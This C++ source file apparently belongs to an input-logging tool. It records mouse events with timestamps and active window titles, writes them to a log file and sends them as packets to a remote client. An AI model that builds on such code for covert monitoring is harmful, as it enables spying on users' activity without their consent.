#include "InputMouse.h"

InputMouse::InputMouse()
{
}

InputMouse::~InputMouse()
{
}

void InputMouse::format(std::streamoff logSize)
{
	std::string winName = StaticTools::GetActiveWindowTitle();
	_format = "";

	if (logSize > 0)
		_format = "\n";
	_format += StaticTools::GetDate() + " | " + ((winName.empty()) ? "NONE" : winName) + " | ";
}

AInputType &InputMouse::operator>>(LogFile &logger)
{
	logger << _format << "[MOUSE " << _data << "]" << std::flush;
	return (*this);
}

AInputType &InputMouse::operator>>(IClient &client)
{
	client << StaticTools::CreatePacket(PacketType::PT_MouseEvent, _format + "[MOUSE " + _data + "]");
	return (*this);
}